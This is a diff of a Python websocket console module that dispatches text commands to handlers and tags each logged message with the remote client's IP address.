@@ -2,30 +2,38 @@ import json
 import threading
 import time
 from cryptoUtil import sendSecretMessage
+from socksUtil import getCurrent
 from modules.abstractModule import Module
 import modules.consoleComands.getComands as comands
 import modules.ConsoleServer as server
 
+
 class ConsoleInWeb(Module):
     type = 0
-    
+
     def __init__(self):
 
         # Iniciar el servidor en un hilo separado
         thread = threading.Thread(target=server.start_server, args=[self])
         thread.daemon = True
         thread.start()
-        
+
     async def handleMessage(self, websocket, msg):
-            self.socket = websocket
-            msg['timestamp'] = time.time()
-            server.consoleOut = json.dumps(msg)
+        msg['timestamp'] = time.time()
+        msg['host'] = getCurrent().remote_ip
+        server.consoleOut = json.dumps(msg)
 
     async def sendMessage(self, websocket, msg):
-        if msg.split(" ")[0] in comands.getComands():
-            await sendSecretMessage(websocket, comands.getComands()[msg.split(" ")[0]].execute(msg))
+        try:
+            cmd = comands.getComands()[msg.split(" ")[0]]
+        except:
+            cmd = comands.getComands()[comands.default]
+        result = cmd.execute(msg)
+        if cmd.sendsMessage:
+            await sendSecretMessage(websocket, result)
         else:
-            await sendSecretMessage(websocket, comands.getComands()[comands.default].execute(msg))
+            await self.handleMessage(None, result)
+        return result
 
 
 '''
